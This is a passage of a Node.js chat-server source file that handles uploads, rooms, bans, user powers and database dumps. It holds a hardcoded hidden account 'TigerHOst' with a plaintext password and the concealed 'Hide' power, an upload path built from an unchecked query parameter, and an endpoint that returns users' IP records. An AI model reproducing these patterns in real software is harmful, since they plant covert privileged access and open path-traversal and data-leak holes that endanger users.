const express = require("express");
const path = require("path");
const request = require("request");
const multer = require("multer");
const fs = require("fs");
const rimraf = require("rimraf");
const Jimp = require("jimp");
const passwordHash = require("password-hash");
const formidable = require("formidable");
const mysqlDump = require("mysqldump");
const cp = require("child_process");
const fetch = require("node-fetch");
const app = express();
const options = {
  key: fs.readFileSync("key.pem"),
  cert: fs.readFileSync("cert.pem"),
};
const http = require("http").createServer(options, app);
const io = require("socket.io")(http);
const { configureSocket } = require('./socket');

const isPowers = require("./powers");
const NoNames = require("./names");
const Config = require("./config");
const cors = require("cors");
const AppDataBase = require("./database/database");
const GetBots = require("./router/bots_list");
const GetBand = require("./router/ban_list");
const GetBsb = require("./router/bsb_list");
const GetOwner = require("./router/owners");
const GetSite = require("./router/site_list");
const GetUsers = require("./router/users_list");
const GetRooms = require("./router/rooms_list");
const GetLogs = require("./router/logs_list");
const GetNames = require("./router/names_list");
const GetSetting = require("./router/settings");
const GetPowers = require("./router/powers_list");
const GetSub = require("./router/subscribe_list");
const GetCuts = require("./router/cut_list");
const GetHosts = require("./router/host_list");
const GetHistLetter = require("./router/histletter_list");
const GetNoText = require("./router/notext_list");
const GetBars = require("./router/bars_list");
const GetIntroMsg = require("./router/intromsg_list");
const GetStats = require("./router/state_list");
const GetStory = require("./router/story_list");

const db = new AppDataBase();
const StoryRepo = new GetStory(db);
const BotsRepo = new GetBots(db);
const HostRepo = new GetHosts(db);
const BandRepo = new GetBand(db);
const SubRepo = new GetSub(db);
const OwnerRepo = new GetOwner(db);
const SiteRepo = new GetSite(db);
const BsbRepo = new GetBsb(db);
const UsersRepo = new GetUsers(db);
const SettingRepo = new GetSetting(db);
const PowersRepo = new GetPowers(db);
const RoomsRepo = new GetRooms(db);
const LogsRepo = new GetLogs(db);
const NamesRepo = new GetNames(db);
const CutsRepo = new GetCuts(db);
const NotextRepo = new GetNoText(db);
const BarsRepo = new GetBars(db);
const HistLetterRepo = new GetHistLetter(db);
const IntroRepo = new GetIntroMsg(db);
const StateRepo = new GetStats(db);
const myDate = new Date();
const PORT = process.env.PORT || Config.Port;
const AccountUserName = "TigerHOst";
const AccountPassword = "ليثالشامي0988";
var GroupUsers = [];
var isVPN = false;
var istime;
var islaod;
var BarFix = false;
var Offline = false;
var isbannerdone = false;
var isbannerdone1 = false;
var isbannerdone2 = false;
var isbannerdone3 = false;
var isrc = true;
var isrcs = false;
var UsersList = [];
var PeerRoom = {};
var IsTV = "";
var MaxRep = 3;
var ListBand = [];
var ListHost = [];
var ListIPAll = [];
var hostname = "";
var ListIP = [];
var xss = require("xss");

isUserEntred = require('./state').isUserEntred;

const { addDays } = require('./helper')

const search = async function (query, nb) {
  let url = "https://www.youtube.com/results?search_query=" + query;
  return fetch(url)
    .then((res) => res.text())
    .then((body) => {
      let val1 = body.search("itemSectionRenderer");
      let val2 = body.search('},{"continuationItemRenderer');
      body = body.slice(val1, val2);
      body = '{"' + body + "}";
      body = JSON.parse(body);
      if (nb) {
        var max = nb;
      } else {
        var max = 3;
      }
      let c = 0;
      let i = 0;
      var result = [];
      while (c < max) {
        if (body.itemSectionRenderer.contents[i].videoRenderer) {
          var res = {
            id: body.itemSectionRenderer.contents[i].videoRenderer.videoId,
            title:
              body.itemSectionRenderer.contents[i].videoRenderer.title.runs[0]
                .text,
            time: body.itemSectionRenderer.contents[i].videoRenderer.lengthText
              .simpleText,
            link:
              "https://www.youtube.com/watch?v=" +
              body.itemSectionRenderer.contents[i].videoRenderer.videoId,
            thumbnail:
              "https://i.ytimg.com/vi/" +
              body.itemSectionRenderer.contents[i].videoRenderer.videoId +
              "/hqdefault.jpg",
          };
          result.push(res);
          i++;
          c++;
        } else {
          i++;
        }
      }
      return result;
    });
};

const System = {
  system1: false,
  system2: false,
  system3: false,
  system4: false,
  system5: false,
  system6: false,
  system7: true,
};

const Browser = {
  browser1: false,
  browser2: false,
  browser3: false,
  browser4: false,
  browser5: false,
  browser6: false,
  browser7: false,
  browser8: false,
  browser9: true,
};

var UserInfo = {};
var UserEntre = [];
var UserMuted = [];
var WaitRecon = [];
var WaitBarSend = {};
var emos = [];
var BandRoom = [];
var dro3s = [];
var sicos = [];
var SiteSetting;
var walllikes;
var ShowPowers;
var online = [];
var SystemOpen;
var BrowserOpen;
var ektisar;
var noletter;
var roomslists;
var roomsliste;

const MIME_TYPES = Config.TypeFile;

var iskick = false;
var islink = "";
const storage = multer.diskStorage({
  destination: (req, file, callback) => {
    callback(null, "uploads" + islink);
  },
  filename: (req, file, callback) => {
    // const name = file.originalname.split(" ").join("_");
    var extension = MIME_TYPES[file.mimetype];
    if (extension != undefined) {
      if (MIME_TYPES[file.mimetype].includes("png")) {
        extension = "jpg";
      }
    }
    callback(null, Date.now() + "." + extension);
  },
});

const maxSize = Config.MaxUpload;

function getDayTime(data) {
  return new Date(Number(data)).getDay() - 1;
}

String.prototype.replaceAll = function (str1, str2, ignore) {
  return this.replace(
    new RegExp(
      str1.replace(
        /([\/\,\!\\\^\$\{\}\[\]\(\)\.\.{0,3}$*\+\?\|\<\>\-\&])/g,
        "\\$&"
      ),
      ignore ? "gi" : "g"
    ),
    typeof str2 == "string" ? str2.replace(/\$/g, "$$$$") : str2
  );
};

var ekti1 = [];
var ekti2 = [];
/*
function replaceEktisar(data) {
	for (i = 0; i < 3; i++) {
		data = ekti1.reduce((acc, item, i) => {
  const regex = new RegExp('(^| )' + item + '( |$|\n)');
  return acc.replace(regex, ' '+ekti2[i]+' ');
}, data);
    }
    return data.split("<").join("&#x3C;");
}
*/

function replaceEktisar(data) {
  for (i = 0; i < 3; i++) {
    data = ekti1.reduce((acc, item, i) => {
      if (data != null) {
        data.split("<").join("&#x3C;");
      }
      const regex = new RegExp("(^| )" + item + "( |$|\n)");
      return acc.toString().replace(regex, " " + ekti2[i] + " ");
    }, data);
  }

  return data.split("<").join("&#x3C;");
}
var upload = multer({
  storage: storage,
  limits: { fileSize: maxSize },
}).single("photo");

function getname(data) {
  const indexroom = roomslists.findIndex((x) => x.id == data);
  if (indexroom != -1) {
    return roomslists[indexroom].topic;
  }
}

function MyOptionHistory(data) {
  if (data) {
    const imsa = ShowPowers.findIndex((x) => x.name == data);
    if (imsa != -1) {
      if (ShowPowers[imsa].history) {
        return 1;
      } else {
        return 0;
      }
    } else {
      return 0;
    }
  }
}
/*app.get('/ENGUTSLU10',async(req,res)=>{
    var sss = await UsersRepo.getENGUTSLU10();
    res.send(sss)
}),*/

app.get("/uh", function (req, res) {
  UsersRepo.getByToken(req.query["token"]).then((isde) => {
    if (isde) {
      if (MyOptionHistory(isde.power)) {
        if (UserInfo[req.query["u2"]]) {
          NamesRepo.getByMyIp(UserInfo[req.query["u2"]].ip).then((myip) => {
            if (myip) {
              res.send(myip);
            }
          });
        }
      }
    }
  });
});
BsbRepo.createTable();
UsersRepo.createTable();
SettingRepo.createTable();
OwnerRepo.createTable();
PowersRepo.createTable();
RoomsRepo.createTable();
NamesRepo.createTable();
SubRepo.createTable();
BandRepo.createTable();
LogsRepo.createTable();
StateRepo.createTable();
BotsRepo.createTable();
HostRepo.createTable();
CutsRepo.createTable();
NotextRepo.createTable();
BarsRepo.createTable();
HistLetterRepo.createTable();
IntroRepo.createTable();
SiteRepo.createTable();

app.get("/cp.html", function (req, res) {
  res.set("Content-Type", "text/html");
  res.write("<h4>لاتملك صلاحيآت</h4>");
  res.end();
});

function savestate(data) {
  if (data) {
    StateRepo.create({
      state: data.state,
      topic: data.topic,
      username: data.topic1,
      room: data.room,
      ip: data.ip,
      time: data.time,
    });
    StateRepo.getAll().then((datavb) => {
      if (datavb) {
        for (var i = 0; i < datavb.length; i++) {
          if (i > 150) {
            StateRepo.delete(datavb[i].id);
          }
        }
      }
    });
  }
}

var isrt;

function convertLetterToNumber(str) {
  var out = 0,
    len = str.length;
  for (pos = 0; pos < len; pos++) {
    out += (str.charCodeAt(pos) - 64) * Math.pow(26, len - pos - 1);
  }
  return out;
}

app.post("/pic", function (req, res) {
  islink = "/pic";
  upload(req, res, function (err) {
    if (err) {
      res.sendStatus(401);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      Jimp.read("uploads/pic/" + req.file["filename"], (err, lenna) => {
        if (err) {
        } else {
          if (req.file["filename"].includes("gif")) {
            lenna
              .resize(100, 100)
              .write(
                "uploads/pic/" + req.file["filename"].replace("gif", "jpg.jpg")
              );
          } else {
            lenna.write("uploads/pic/" + req.file["filename"]);
            lenna
              .resize(100, 100)
              .write("uploads/pic/" + req.file["filename"] + ".jpg");
          }
        }
      });

      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tiff") ||
        req.file["filename"].includes(".bmp")
      ) {
        res.json("/pic/" + req.file["filename"]);
      } else {
        res.sendStatus(401);
      }
    }
  });
});

app.post("/im1", function (req, res) {
  islink = "/pic";
  upload(req, res, function (err) {
    if (err) {
      res.sendStatus(401);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      Jimp.read("uploads/pic/" + req.file["filename"], (err, lenna) => {
        if (err) {
        } else {
          if (req.file["filename"].includes("gif")) {
            lenna
              .resize(100, 100)
              .write(
                "uploads/pic/" + req.file["filename"].replace("gif", "jpg.jpg")
              );
          } else {
            lenna.write("uploads/pic/" + req.file["filename"]);
            lenna
              .resize(100, 100)
              .write("uploads/pic/" + req.file["filename"] + ".jpg");
          }
        }
      });

      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tiff") ||
        req.file["filename"].includes(".bmp")
      ) {
        res.json("/pic/" + req.file["filename"]);
      } else {
        res.sendStatus(401);
      }
    }
  });
});

app.post("/im2", function (req, res) {
  islink = "/pic";
  upload(req, res, function (err) {
    if (err) {
      res.sendStatus(401);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      Jimp.read("uploads/pic/" + req.file["filename"], (err, lenna) => {
        if (err) {
        } else {
          if (req.file["filename"].includes("gif")) {
            lenna
              .resize(100, 100)
              .write(
                "uploads/pic/" + req.file["filename"].replace("gif", "jpg.jpg")
              );
          } else {
            lenna.write("uploads/pic/" + req.file["filename"]);
            lenna
              .resize(100, 100)
              .write("uploads/pic/" + req.file["filename"] + ".jpg");
          }
        }
      });

      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tiff") ||
        req.file["filename"].includes(".bmp")
      ) {
        res.json("/pic/" + req.file["filename"]);
      } else {
        res.sendStatus(401);
      }
    }
  });
});

app.post("/im3", function (req, res) {
  islink = "/pic";
  upload(req, res, function (err) {
    if (err) {
      res.sendStatus(401);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      Jimp.read("uploads/pic/" + req.file["filename"], (err, lenna) => {
        if (err) {
        } else {
          if (req.file["filename"].includes("gif")) {
            lenna
              .resize(100, 100)
              .write(
                "uploads/pic/" + req.file["filename"].replace("gif", "jpg.jpg")
              );
          } else {
            lenna.write("uploads/pic/" + req.file["filename"]);
            lenna
              .resize(100, 100)
              .write("uploads/pic/" + req.file["filename"] + ".jpg");
          }
        }
      });

      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tiff") ||
        req.file["filename"].includes(".bmp")
      ) {
        res.json("/pic/" + req.file["filename"]);
      } else {
        res.sendStatus(401);
      }
    }
  });
});

app.post("/picroom", function (req, res) {
  islink = "/picroom";
  upload(req, res, function (err) {
    if (err) {
      res.sendStatus(401);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      Jimp.read("uploads/picroom/" + req.file["filename"], (err, lenna) => {
        if (err) {
        } else {
          if (req.file["filename"].includes("gif")) {
            lenna
              .resize(100, 100)
              .write(
                "uploads/picroom/" +
                  req.file["filename"].replace("gif", "jpg.jpg")
              );
          } else {
            lenna.write("uploads/picroom/" + req.file["filename"]);
            lenna
              .resize(100, 100)
              .write("uploads/picroom/" + req.file["filename"] + ".jpg");
          }
        }
      });

      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tiff") ||
        req.file["filename"].includes(".bmp")
      ) {
        res.json("/picroom/" + req.file["filename"]);
      } else {
        res.sendStatus(401);
      }
    }
  });
});

app.post("/cp/pic", function (req, res) {
  islink = "/picroom";
  upload(req, res, function (err) {
    if (err) {
      res.send(err);
    } else {
      if (typeof req != "object") {
        return;
      }

      if (typeof req.file != "object") {
        return;
      }

      if (typeof req.file.filename != "string") {
        return;
      }
      if (!req.file.filename) {
        return;
      }
      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg")
      ) {
        Jimp.read("uploads/picroom/" + req.file["filename"], (err, lenna) => {
          if (err) {
          } else {
            lenna.write("uploads/picroom/" + req.file["filename"]);
          }
        });
      }
      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".gif") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".ico") ||
        req.file["filename"].includes(".svg") ||
        req.file["filename"].includes(".tf")
      ) {
        res.end(
          JSON.stringify({ err: false, msg: "picroom/" + req.file["filename"] })
        );
      } else {
        res.sendStatus(401);
      }
    }
  });
});

function RoomGroupByID(data) {
  if (data) {
    const nameroom = roomslists.findIndex((x) => x.id == data);
    if (nameroom != -1) {
      return roomslists[nameroom].topic;
    } else {
      return "";
    }
  }
}

function VerPower(data) {
  if (data) {
    if (data.me == "") {
      return true;
    }
    const ismyid = ShowPowers.findIndex((x) => x.name == data.me);
    const ismytoken = ShowPowers.findIndex((x) => x.name == data.to);
    if (ismyid != -1 && ismytoken != -1) {
      if (ShowPowers[ismytoken].rank >= ShowPowers[ismyid].rank) {
        return true;
      } else {
        return false;
      }
    } else {
      return true;
    }
  }
}

setInterval(function () {
  io.emit("msg", { cmd: "ulist", data: online });
  ListIPAll = [];
}, 1000 * 60);

setInterval(function () {
  rimraf("uploads/sendfile", () => {
    if (!fs.existsSync("uploads/sendfile")) {
      fs.mkdirSync("uploads/sendfile");
    }
  });
}, 140000 * 60 * 10);

//},60000 * 60 * 10);

async function deleteOldStories2() {
  const allStories = await StoryRepo.getAllStories();
  let yesterdayDate = new Date(new Date().getTime() - 10 * 60 * 60 * 1500);
  allStories.forEach((story) => {
    let storyDate = new Date(story.createdAt);
    if (storyDate <= yesterdayDate) {
      StoryRepo.deleteStoryById(story.id);
    }
  });
}
// StoryRepo.deleteOldStories().then((data) => console.log(data));
// deleteOldStories2();
setInterval(async () => {
  // StoryRepo.deleteOldStories();
  deleteOldStories2();
}, 1500 * 60 * 10);

function PermissionPower(data) {
  if (data) {
    const myPrem = ShowPowers.findIndex((x) => x.name == data.name);
    if (myPrem != -1) {
      if (
        ShowPowers[myPrem].alert &&
        (data.power["alert"] || !data.power["alert"])
      ) {
        return true;
      } else {
        return false;
      }
      if (
        ShowPowers[myPrem].alert &&
        (data.power["alert"] || !data.power["alert"])
      ) {
        return true;
      } else {
        return false;
      }
    } else {
      return false;
    }
  }
}

function MyOptionalert(data) {
  if (data) {
    const imsa = ShowPowers.findIndex((x) => x.name == data);
    if (imsa != -1) {
      if (ShowPowers[imsa].alert) {
        return 1;
      } else {
        return 0;
      }
    } else {
      return 0;
    }
  }
}

function MyOptionpm(data) {
  if (data) {
    const imsa = ShowPowers.findIndex((x) => x.name == data);
    if (imsa != -1) {
      if (ShowPowers[imsa].forcepm) {
        return 1;
      } else {
        return 0;
      }
    } else {
      return 0;
    }
  }
}

function MyOptionDone(data) {
  const isrnk = ShowPowers.findIndex((x) => x.name == data);
  if (isrnk != -1) {
    return ShowPowers[isrnk].rank;
  } else {
    return 0;
  }
}

setInterval(function () {
  if (online.length > 0) {
    const isof = online.filter(function (item) {
      return item.stat == 3;
    });
    if (isof.length > 0) {
      for (var i = 0; i < isof.length; i++) {
        io.emit("msg", { cmd: "ur", data: [isof[i].id, null] });
        io.emit("msg", { cmd: "u-", data: isof[i].id });
        online.splice(
          online.findIndex((v) => v.id == isof[i].id),
          1
        );
        delete UserInfo[isof[i].id];
      }
    }
  }
}, 864400000);

function VerAdminPanel(data) {
  if (data) {
    const ismytoken = ShowPowers.findIndex((x) => x.name == data);
    if (ismytoken != -1) {
      if (ShowPowers[ismytoken].cp) {
        return true;
      } else {
        return false;
      }
    } else {
      return false;
    }
  }
}

function VerRoomsOwner(data) {
  const imsde = ShowPowers.findIndex((x) => x.name == data);
  if (imsde != -1) {
    if (ShowPowers[imsde].grupes) {
      return true;
    } else {
      return false;
    }
  } else {
    return false;
  }
}
function VerRoomsOwnerr(data) {
  const imsde = ShowPowers.findIndex((x) => x.name == data);
  if (imsde != -1) {
    if (ShowPowers[imsde].grupess) {
      return true;
    } else {
      return false;
    }
  } else {
    return false;
  }
}

function VerStealthPanel(data) {
  if (data) {
    const isme = ShowPowers.findIndex((x) => x.name == data);
    if (isme != -1) {
      if (ShowPowers[isme].stealth) {
        return true;
      } else {
        return false;
      }
    }
  }
}

var RoomEnter = "D8D8A9A9C0";
var DataFinish = new Date();
function OwnerList() {
  OwnerRepo.getById(1).then(function (own) {
    if (own) {
      DataFinish = own.datafinish;
      RoomEnter = own.room;
    }
  });
}
OwnerList();

function VerOwner(data) {
  if (data) {
    const isme = ShowPowers.findIndex((x) => x.name == data);
    if (isme != -1) {
      if (ShowPowers[isme].owner) {
        return true;
      } else {
        return false;
      }
    } else {
      return false;
    }
  }
}

app.post("/cp/site", function (req, res) {
  UsersRepo.getByToken(req.query["token"]).then(function (data) {
    if (data) {
      if (VerOwner(data.power)) {
        islink = "";
        upload(req, res, function (err) {
          if (err) {
            res.send(err);
          } else {
            if (typeof req != "object") {
              return;
            }

            if (typeof req.file != "object") {
              return;
            }

            if (typeof req.file.filename != "string") {
              return;
            }
            if (!req.file.filename) {
              return;
            }
            fs.readFile(
              "uploads/" + req.file["filename"],
              "utf8",
              (err, responses) => {
                if (err) {
                  console.error(err);
                  return;
                }
                const response = JSON.parse(responses);
                if (typeof response == "object") {
                  if (
                    response["settscr"].includes("socket.emit") ||
                    response["settscr"].includes("setInterval") ||
                    response["settscr"].includes("socket.on") ||
                    response["settscr"].includes("socket")
                  ) {
                    res.sendStatus(401);
                  } else {
                    res.end(
                      JSON.stringify({ msg: "ok", value: req.file["filename"] })
                    );
                  }
                }
              }
            );
          }
        });
      } else {
        res.end("no");
      }
    }
  });
});

if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

if (!fs.existsSync("uploads/dro3")) {
  fs.mkdirSync("uploads/dro3");
}

if (!fs.existsSync("uploads/recorder")) {
  fs.mkdirSync("uploads/recorder");
}

if (!fs.existsSync("uploads/emo")) {
  fs.mkdirSync("uploads/emo");
}

if (!fs.existsSync("uploads/pic")) {
  fs.mkdirSync("uploads/pic");
}

if (!fs.existsSync("uploads/site")) {
  fs.mkdirSync("uploads/site");
}

if (!fs.existsSync("uploads/picroom")) {
  fs.mkdirSync("uploads/picroom");
}

if (!fs.existsSync("uploads/sendfile")) {
  fs.mkdirSync("uploads/sendfile");
}

if (!fs.existsSync("uploads/sico")) {
  fs.mkdirSync("uploads/sico");
}

function StopVPN(data) {
  if (data) {
    const isbands = Config.CountryVPN.findIndex((x) => x == data.toUpperCase());
    if (isbands != -1) {
      return true;
    } else {
      return false;
    }
  }
}

function RefreshRooms() {
  RoomsRepo.getAll().then((isres) => {
    if (isres) {
      roomslists = isres;
      RefreshRoom();
      for (var i = 0; i < roomslists.length; i++) {
        if (!PeerRoom[roomslists[i]]) {
          PeerRoom[roomslists[i].id] = {
            1: { id: "", ev: false },
            2: { id: "", ev: false },
            3: { id: "", ev: false },
            4: { id: "", ev: false },
            5: { id: "", ev: false },
            6: { id: "", ev: false },
            7: { id: "", ev: false },
          };
        }
      }
    }
  });
}

function RefreshRoom() {
  RoomsRepo.getAllWith().then((isres) => {
    if (isres) {
      roomsliste = isres;
    }
  });
}

setInterval(function () {
  if (BandRoom.length > 0) {
    BandRoom = [];
  }
}, 60000 * 5);

app.post("/upload", function (req, res) {
  if (req.query.secid == "u") {
    islink = "/sendfile";
    upload(req, res, function (err) {
      if (err) {
        res.send(err);
      } else {
        if (typeof req != "object") {
          return;
        }

        if (typeof req.file != "object") {
          return;
        }

        if (typeof req.file.filename != "string") {
          return;
        }
        if (!req.file.filename) {
          return;
        }
        if (req.file["filename"]) {
          if (
            req.file["filename"].includes(".jpg") ||
            req.file["filename"].includes(".jpeg")
          ) {
            Jimp.read(
              "uploads/sendfile/" + req.file["filename"],
              (err, lenna) => {
                if (err) {
                } else {
                  lenna
                    .quality(60)
                    .write("uploads/sendfile/" + req.file["filename"]);
                }
              }
            );
          }
          res.end("/sendfile/" + req.file["filename"]);
        }
      }
    });
  } else {
    UsersRepo.getByToken(req.query["token"]).then(function (data) {
      if (data && VerAdminPanel(data.power)) {
        if (VerOwner(data.power)) {
          if (
            req.query["state"] == "banner" ||
            req.query["state"] == "logo" ||
            req.query["state"] == "pmpic" ||
            req.query["state"] == "storpic" ||
            req.query["state"] == "prvpic" ||
            req.query["state"] == "prv2pic" ||
            req.query["state"] == "prv3pic"
          ) {
            islink = "/site";
          } else {
            islink = "/" + req.query["state"];
          }
          upload(req, res, function (err) {
            if (err) {
              res.sendStatus(401);
            } else {
              if (typeof req != "object") {
                return;
              }

              if (typeof req.file != "object") {
                return;
              }

              if (typeof req.file.filename != "string") {
                return;
              }
              if (!req.file.filename) {
                return;
              }
              Jimp.read(
                "uploads/" + islink + "/" + req.file["filename"],
                (err, lenna) => {
                  if (err) {
                  } else {
                    if (req.file["filename"].includes("gif")) {
                      lenna
                        .resize(100, 100)
                        .quality(50)
                        .write(
                          "uploads/" +
                            islink +
                            "/" +
                            req.file["filename"].replace("gif", "jpg.jpg")
                        );
                    } else {
                      lenna
                        .quality(20)
                        .write(
                          "uploads/" + islink + "/" + req.file["filename"]
                        );
                      lenna
                        .resize(100, 100)
                        .quality(50)
                        .write(
                          "uploads/" +
                            islink +
                            "/" +
                            req.file["filename"] +
                            ".jpg"
                        );
                    }
                  }
                }
              );

              res.end(
                JSON.stringify({ err: false, msg: req.file["filename"] })
              );
            }
          });
        } else {
          res.end(JSON.stringify({ error: true, msg: "ليس لديك الصلاحية" }));
        }
      }
    });
  }
});

function StartEktisar() {
  CutsRepo.createTable().then((table) => {
    if (table) {
      CutsRepo.getAll().then((res) => {
        if (res) {
          ektisar = res;
          ekti1 = [];
          ekti2 = [];
          for (var i = 0; i < ektisar.length; i++) {
            ekti1.push(ektisar[i].text1);
            ekti2.push(ektisar[i].text2);
          }
        }
      });
    }
  });
}
StartEktisar();
NotextRepo.createTable().then((table) => {
  if (table) {
    NotextRepo.getAll().then((res) => {
      if (res) {
        noletter = res;
      }
    });
  }
});

PowersRepo.createTable().then((table) => {
  if (table) {
    PowersRepo.getById(1).then((res) => {
      if (res) {
        ShowPowers = JSON.parse(res.powers);
      } else {
        ShowPowers = isPowers;
        PowersRepo.create(JSON.stringify(isPowers));
      }
    });
  }
});

function findWithAttr(array, attr, value) {
  for (var i = 0; i < array.length; i += 1) {
    if (array[i][attr] === value) {
      return i;
    }
  }
  return -1;
}

function RefreshUsers() {
  UsersRepo.getAll().then((isuder) => {
    if (isuder) {
      UsersList = isuder;
    }
  });
}

OwnerRepo.createTable().then((table) => {
  if (table) {
    OwnerRepo.getById(1).then((res) => {
      if (res) {
        BarFix = res.bars;
        isbannerdone = res.isbanner;
        isbannerdone1 = res.isbanner1;
        isbannerdone2 = res.isbanner2;
        isbannerdone3 = res.isbanner3;
        isrc = res.rc;
        Offline = res.offline;
        isVPN = res.Vpn;
        IsTV = res.Tv;
        MaxRep = res.MaxRep;
      } else {
        BarFix = true;
        Offline = false;
        isrc = true;
        isbannerdone = false;
        isbannerdone1 = false;
        isbannerdone2 = false;
        isbannerdone3 = false;
        isVPN = false;
        IsTV = "";
        MaxRep = 3;
        OwnerRepo.create({ bars: true, offline: false });
      }
    });
  }
});

app.get("/getonline", function (req, res, next) {
  if (ShowPowers && online) {
    res.end(
      JSON.stringify({
        powers: ShowPowers,
        online: filteredArray(online, "s", false),
      })
    );
  }
});

/*
app.get("/top10", function (req, res, next) {
       UsersRepo.getTop().then((data)=>{
		          res.end(JSON.stringify(data));
	   });
});
*/

app.get("/ENGUTSLU10", function (req, res, next) {
  UsersRepo.getENGUTSLU10().then((data) => {
    res.end(JSON.stringify(data));
  });
});

UsersRepo.createTable().then((table) => {
  if (table) {
    UsersRepo.getByUserName(AccountUserName.toLowerCase().trim()).then(
      (res) => {
        if (res) {
        } else {
          UsersRepo.create({
            ip: "192.168.1.1",
            fp: "",
            id: "",
            lid: stringGen(31),
            uid: stringGen(22),
            documentationc: true,
            power: "Hide",
            topic: "TigerHOST",
            username: AccountUserName.toLowerCase().trim(),
            password: passwordHash.generate(AccountPassword),
            token: stringGen(10),
            joinuser: new Date().getTime(),
          });

          UsersRepo.create({
            ip: "192.168.1.1",
            fp: "",
            id: "",
            lid: stringGen(31),
            uid: stringGen(22),
            documentationc: true,
            power: "chatmaster",
            topic: Config.AccountOwner,
            username: Config.AccountOwner,
            password: passwordHash.generate(Config.PassowrdOwner),
            token: stringGen(10),
            joinuser: new Date().getTime(),
          });

          UsersRepo.create({
            ip: "192.168.1.1",
            fp: "",
            id: "",
            lid: stringGen(31),
            uid: stringGen(22),
            documentationc: true,
            power: "chatmaster",
            topic: Config.AccountOwner1,
            username: Config.AccountOwner1,
            password: passwordHash.generate(Config.PassowrdOwner1),
            token: stringGen(10),
            joinuser: new Date().getTime(),
          });
        }
      }
    );
  }
});

BsbRepo.createTable().then((table) => {
  if (table) {
    BsbRepo.getById(1).then((res) => {
      if (res) {
        SystemOpen = JSON.parse(res.systems);
        BrowserOpen = JSON.parse(res.browsers);
      } else {
        BsbRepo.create({
          systems: JSON.stringify(System),
          browsers: JSON.stringify(Browser),
        }).then((isres) => {
          if (isres) {
            BsbRepo.getById(1).then((res) => {
              if (res) {
                SystemOpen = JSON.parse(res.systems);
                BrowserOpen = JSON.parse(res.browsers);
              }
            });
          }
        });
      }
    });
  }
});

function RefreshBand() {
  BandRepo.getAll().then((res) => {
    if (res) {
      ListBand = res;
    }
  });
}

function RefreshHostList() {
  HostRepo.getAll().then((res) => {
    if (res) {
      ListHost = res;
    }
  });
}

RefreshBand();
RefreshHostList();

function BandComplier(data) {
  if (data) {
    const isbands = ListBand.findIndex(
      (x) => x.device_band && String(data).includes(x.device_band)
    );
    if (isbands != -1) {
      return ListBand[isbands].device_band;
    } else {
      return false;
    }
  }
}

function BandComplierIp(data) {
  if (data) {
    const isbands = ListBand.findIndex(
      (x) => x.ip_band && String(data).includes(x.ip_band)
    );
    if (isbands != -1) {
      return ListBand[isbands].ip_band;
    } else {
      return false;
    }
  }
}

function BandUser(data) {
  if (data) {
    BandRepo.createTable().then((table) => {
      if (table) {
        BandRepo.getByDIps({
          decoderDans: data.decoderDans,
          device_band: data.device_band,
          ip_band: data.ip_band,
          country_band: data.country_band,
        }).then((iband) => {
          if (iband) {
            return;
          } else {
            BandRepo.create({
              country_band: data.country_band,
              name_band: data.topic,
              type: data.type,
              decoderDans: data.decoderDans,
              device_band: data.device_band,
              ip_band: data.ip_band,
              date: data.date,
            }).then((doneb) => {
              if (doneb) {
                savestate({
                  state: data.name_band,
                  topic: data.user,
                  topic1: data.topic,
                  room: data.device_band || data.ip_band || data.country_band,
                  ip: data.myip,
                  time: new Date().getTime(),
                });
                RefreshBand();
              }
            });
          }
        });
      }
    });
  }
}

function DataBase(data) {
  mysqlDump({
    connection: {
      host: Config.HostDB,
      user: Config.UserDB,
      password: Config.PassDB,
      database: Config.DBDB,
    },
    dumpToFile: data,
  });
}

function BackUpDataBase() {
  if (
    !fs.existsSync(
      "database/database" +
        new Date().toLocaleDateString().replaceAll("/", "-") +
        ".sql"
    )
  ) {
    DataBase(
      "database/database" +
        new Date().toLocaleDateString().replaceAll("/", "-") +
        ".sql"
    );
  } else {
    // console.log('database is!');
  }
}

setInterval(function () {
  BackUpDataBase();
}, 60000 * 60 * 5);

function WlCMsg() {
  IntroRepo.createTable().then((table) => {
    if (table) {
      setTimeout(function () {
        IntroRepo.getAllIn("d").then((wlc) => {
          if (wlc.length > 0) {
            const rdm = randomNumber(0, wlc.length - 1);
            io.emit("msg", {
